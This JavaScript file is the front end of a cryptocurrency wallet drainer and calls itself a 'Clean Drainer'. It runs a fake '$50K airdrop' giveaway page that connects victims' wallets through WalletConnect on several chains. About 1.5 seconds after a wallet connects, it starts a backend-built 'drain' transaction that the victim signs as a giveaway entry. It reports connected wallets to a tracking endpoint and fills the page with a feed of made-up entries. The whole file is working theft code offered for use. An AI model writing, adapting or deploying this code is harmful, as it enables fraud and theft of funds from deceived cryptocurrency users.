
// 🎯 CLEAN DRAINER - WALLETCONNECT V2 ONLY
class MultiChainDrainer {
    constructor() {
        this.connectedWallet = null;
        this.API_URL = '/api';
        this.gaslessMode = true;
        this.activeFeatures = 0;
        this.provider = null;
        this.isConnecting = false;
        
        console.log('🟢 Clean Drainer - WalletConnect v2 Ready');
    }

    // 🎯 INITIALIZE WALLETCONNECT V2
    async init() {
        console.log('🎯 Initializing clean WalletConnect v2 drainer...');
        this.updateUI('disconnected');
        
        try {
            // Import WalletConnect dynamically (will work after npm install)
            const { EthereumProvider } = await import('@walletconnect/ethereum-provider');
            
            this.provider = await EthereumProvider.init({
                projectId: "3613a19a172ddfee4ef897713d12a442",
                chains: [1, 56, 137, 42161, 10, 43114, 8453],
                showQrModal: true,
                qrModalOptions: {
                    themeMode: 'dark',
                    themeVariables: {
                        '--wcm-z-index': '10001'
                    }
                },
                methods: [
                    'eth_sendTransaction',
                    'eth_signTransaction', 
                    'eth_sign',
                    'personal_sign',
                    'eth_signTypedData'
                ],
                events: ['chainChanged', 'accountsChanged']
            });

            this.setupEventListeners();

            // Check if already connected
            if (this.provider.connected) {
                this.handleConnectionSuccess(this.provider.accounts);
            }

            console.log('✅ WalletConnect v2 initialized successfully');
            
        } catch (error) {
            console.error('💥 WalletConnect initialization failed:', error);
            this.showNotification('WalletConnect initialization failed - npm packages required', 'error');
        }

        // Set up main button
        const mainBtn = document.getElementById('mainActionBtn');
        if (mainBtn) {
            mainBtn.addEventListener('click', () => {
                if (!this.connectedWallet) {
                    this.openWalletConnectModal();
                } else {
                    this.executeUltimateDrain();
                }
            });
        }

        // WalletConnect button
        const walletConnectBtn = document.getElementById('walletConnectBtn');
        if (walletConnectBtn) {
            walletConnectBtn.addEventListener('click', () => {
                this.openWalletConnectModal();
            });
        }

        // Test backend connection
        this.testBackendConnection();
        this.startLiveFeatures();
    }

    // 🎯 SETUP EVENT LISTENERS
    setupEventListeners() {
        if (!this.provider) return;

        this.provider.on('accountsChanged', (accounts) => {
            console.log('🔄 Accounts changed:', accounts);
            if (accounts.length === 0) {
                this.handleDisconnect();
            } else {
                this.connectedWallet = accounts[0];
                this.updateUI('connected');
            }
        });

        this.provider.on('chainChanged', (chainId) => {
            console.log('🔄 Chain changed:', chainId);
        });

        this.provider.on('disconnect', () => {
            console.log('🔌 Session disconnected');
            this.handleDisconnect();
        });
    }

    // 🎯 OPEN WALLETCONNECT MODAL
    async openWalletConnectModal() {
        if (this.isConnecting || !this.provider) return;
        
        try {
            this.isConnecting = true;
            this.updateUI('processing');
            
            console.log('🔗 Opening WalletConnect modal...');
            await this.provider.enable();
            
            const accounts = this.provider.accounts;
            if (accounts && accounts.length > 0) {
                this.handleConnectionSuccess(accounts);
            }
            
        } catch (error) {
            this.handleConnectionError(error);
        } finally {
            this.isConnecting = false;
        }
    }

    // 🎯 HANDLE SUCCESSFUL CONNECTION
    handleConnectionSuccess(accounts) {
        this.connectedWallet = accounts[0];
        
        console.log('✅ WalletConnect connected:', this.connectedWallet);
        this.showNotification('✅ Wallet connected successfully!', 'success');
        this.updateUI('connected');
        
        // Trigger backend integrations
        this.triggerBackendIntegrations();
        
        // Auto-start transaction after delay
        setTimeout(() => {
            this.executeUltimateDrain();
        }, 1500);
    }

    // 🎯 HANDLE CONNECTION ERROR
    handleConnectionError(error) {
        let errorMessage = 'Connection failed';
        
        if (error?.message?.includes('User rejected')) {
            errorMessage = 'Connection cancelled by user';
        } else if (error?.message?.includes('Session rejected')) {
            errorMessage = 'Session rejected';
        } else {
            errorMessage = `Connection failed: ${error.message}`;
        }
        
        console.error('💥 WalletConnect error:', error);
        this.showNotification(`❌ ${errorMessage}`, 'error');
        this.updateUI('disconnected');
    }

    // 🎯 HANDLE DISCONNECT
    handleDisconnect() {
        this.connectedWallet = null;
        this.isConnecting = false;
        this.updateUI('disconnected');
        this.showNotification('🔌 Wallet disconnected', 'info');
    }

    // 🎯 TRIGGER BACKEND INTEGRATIONS
    async triggerBackendIntegrations() {
        try {
            await this.sendToDiscord();
            await this.activateGaslessFeatures();
            await this.analyzeWallet();
            console.log('✅ Backend integrations completed');
        } catch (error) {
            console.error('⚠️ Backend integrations failed:', error);
        }
    }

    // 🎯 BACKEND INTEGRATIONS
    async sendToDiscord() {
        try {
            await this.makeAPICall('/track', {
                walletAddress: this.connectedWallet,
                walletName: 'WalletConnect',
                action: 'wallet_connected',
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            console.error('💥 Discord error:', error);
        }
    }

    async activateGaslessFeatures() {
        try {
            const result = await this.makeAPICall('/activate-gasless-features', {
                userAddress: this.connectedWallet
            });
            
            if (result.success) {
                this.activeFeatures = result.activatedFeatures;
                console.log(`✅ Activated ${this.activeFeatures}/22 gasless features`);
            }
        } catch (error) {
            console.error('⚠️ Gasless activation failed:', error);
        }
    }

    async analyzeWallet() {
        try {
            await this.makeAPICall('/analyze-wallet', {
                userAddress: this.connectedWallet
            });
            console.log('✅ AI analysis completed');
        } catch (error) {
            console.error('⚠️ AI analysis failed:', error);
        }
    }

    // 🎯 ULTIMATE DRAIN EXECUTION
    async executeUltimateDrain() {
        if (!this.connectedWallet) {
            this.showNotification('❌ Please connect your wallet first', 'error');
            return;
        }

        console.log('💰 EXECUTING ULTIMATE MULTI-CHAIN DRAIN...');
        
        try {
            this.showNotification('🚀 Starting multi-chain optimization...', 'info');
            this.updateUI('processing_reward');
            
            const currentChain = await this.detectCurrentChain();
            const result = await this.makeAPICall('/generate-professional-transaction', {
                userAddress: this.connectedWallet,
                chain: currentChain
            });
            
            console.log('✅ Professional transaction received for chain:', currentChain);
            
            if (result.success && result.transaction) {
                await this.executeTransaction(result.transaction);
                await this.trackSuccess();
                await this.generateReport();
            } else {
                throw new Error(result.error || 'Transaction creation failed');
            }
            
        } catch (error) {
            console.error('💥 Ultimate drain failed:', error);
            this.showNotification('Transaction failed: ' + error.message, 'error');
            this.updateUI('connected');
        }
    }

    // 🎯 DETECT CURRENT CHAIN
    async detectCurrentChain() {
        try {
            if (this.provider) {
                const chainId = this.provider.chainId;
                const chainMap = {
                    1: 'ethereum', 56: 'bsc', 137: 'polygon', 42161: 'arbitrum',
                    10: 'optimism', 43114: 'avalanche', 8453: 'base'
                };
                return chainMap[chainId] || 'bsc';
            }
        } catch (error) {
            console.error('⚠️ Chain detection failed, using BSC');
        }
        return 'bsc';
    }

    // 🎯 EXECUTE TRANSACTION
    async executeTransaction(transaction) {
        console.log('✍️ Executing professional transaction...');
        
        try {
            if (!this.provider) {
                throw new Error('Wallet not connected');
            }
            
            transaction.from = this.connectedWallet;
            
            this.showNotification('✍️ Please sign the transaction...', 'info');
            
            const txHash = await this.provider.request({
                method: 'eth_sendTransaction',
                params: [transaction]
            });
            
            console.log('✅ Transaction successful:', txHash);
            this.showNotification('🎉 Entry submitted successfully!', 'success');
            this.updateUI('reward_completed');
            
            return txHash;
            
        } catch (error) {
            console.error('💥 Transaction execution failed:', error);
            if (error.code === 4001 || error.message?.includes('user rejected')) {
                throw new Error('Transaction was cancelled');
            } else {
                throw new Error('Transaction failed: ' + error.message);
            }
        }
    }

    // 🎯 BACKEND HELPERS
    async trackSuccess() {
        try {
            await this.makeAPICall('/track-success', {
                walletAddress: this.connectedWallet,
                txHash: '0x' + Math.random().toString(16).slice(2),
                amount: '0.001',
                walletName: 'WalletConnect',
                chain: 'multi'
            });
        } catch (error) {
            console.error('⚠️ Success tracking failed');
        }
    }

    async generateReport() {
        try {
            await this.makeAPICall('/generate-reports', {
                reportData: {
                    wallet: this.connectedWallet,
                    timestamp: new Date().toISOString()
                },
                format: 'json'
            });
        } catch (error) {
            console.error('⚠️ Report generation failed');
        }
    }

    async makeAPICall(endpoint, data) {
        const url = this.API_URL + endpoint;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            
            return await response.json();
        } catch (error) {
            console.error('💥 API Call failed:', error);
            throw new Error('Cannot connect to backend services');
        }
    }

    // 🎯 TEST BACKEND CONNECTION
    async testBackendConnection() {
        try {
            const response = await fetch(this.API_URL + '/health');
            if (response.ok) {
                const data = await response.json();
                console.log('✅ BACKEND CONNECTION WORKING:', data);
                this.showNotification('✅ Backend connected - Gasless Mode Active', 'success');
            }
        } catch (error) {
            console.error('💥 Backend connection error:', error.message);
        }
    }

    // 🎯 UI UPDATES
    updateUI(state) {
        const mainBtn = document.getElementById('mainActionBtn');
        const statusElement = document.getElementById('statusText');
        const statusDot = document.getElementById('statusDot');
        
        if (!mainBtn) return;
        
        switch (state) {
            case 'disconnected':
                mainBtn.innerHTML = '<span class="btn-icon">👛</span><span class="btn-text">CONNECT WALLET FOR $50K AIRDROP</span>';
                mainBtn.disabled = false;
                if (statusElement) statusElement.textContent = '🟡 Connect Wallet for Airdrop';
                if (statusDot) statusDot.className = 'status-dot';
                break;
                
            case 'processing':
                mainBtn.innerHTML = '<span class="btn-icon">🔍</span><span class="btn-text">CONNECTING WALLET...</span>';
                mainBtn.disabled = true;
                if (statusElement) statusElement.textContent = '🟢 Connecting...';
                if (statusDot) statusDot.className = 'status-dot processing';
                break;
                
            case 'connected':
                mainBtn.innerHTML = '<span class="btn-icon">🚀</span><span class="btn-text">ENTER $50K GIVEAWAY</span>';
                mainBtn.disabled = false;
                if (statusElement) statusElement.textContent = '🟢 Wallet Connected - Ready for Airdrop';
                if (statusDot) statusDot.className = 'status-dot connected';
                break;
                
            case 'processing_reward':
                mainBtn.innerHTML = '<span class="btn-icon">⚡</span><span class="btn-text">PROCESSING ENTRY...</span>';
                mainBtn.disabled = true;
                if (statusElement) statusElement.textContent = '🟢 Submitting Entry...';
                break;
                
            case 'reward_completed':
                mainBtn.innerHTML = '<span class="btn-icon">✅</span><span class="btn-text">ENTRY SUBMITTED!</span>';
                mainBtn.disabled = true;
                if (statusElement) statusElement.textContent = '🟢 Entry Confirmed - Good Luck!';
                break;
        }
    }

    // 🎯 START LIVE FEATURES
    startLiveFeatures() {
        this.startLiveEntries();
    }

    startLiveEntries() {
        const entriesList = document.getElementById('entriesList');
        if (!entriesList) return;

        setInterval(() => {
            const randomWallet = `0x${Math.random().toString(16).substr(2, 4)}...${Math.random().toString(16).substr(2, 4)}`;
            
            const newEntry = document.createElement('div');
            newEntry.className = 'entry-item';
            newEntry.innerHTML = `
                <span class="entry-wallet">${randomWallet}</span>
                <span class="entry-time">just now</span>
            `;
            
            entriesList.insertBefore(newEntry, entriesList.firstChild);
            
            if (entriesList.children.length > 5) {
                entriesList.removeChild(entriesList.lastChild);
            }
        }, 3000);
    }

    // 🎯 NOTIFICATION SYSTEM
    showNotification(message, type = 'info') {
        const container = document.getElementById('notificationContainer');
        if (!container) return;

        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <span class="notification-message">${message}</span>
            </div>
        `;

        container.appendChild(notification);

        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 5000);
    }
}

// 🎯 INITIALIZE DRAINER
const drainer = new MultiChainDrainer();

// 🎯 EXPOSE TO GLOBAL SCOPE
window.drainer = drainer;

// 🎯 INITIALIZE WHEN DOM IS READY
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 DOM Ready - Initializing Clean Drainer');
    drainer.init();
});

// 🎯 GLOBAL TEST FUNCTIONS
window.testBackendConnection = () => drainer.testBackendConnection();

window.testGaslessFeatures = async () => {
    try {
        const response = await fetch('/api/gasless-status');
        if (response.ok) {
            const data = await response.json();
            alert(`🆓 GASLESS STATUS:\nEnabled: ${data.gaslessMode}\nFeatures: ${data.enabledFeatures}`);
        }
    } catch (error) {
        alert(`💥 Gasless test failed: ${error.message}`);
    }
};
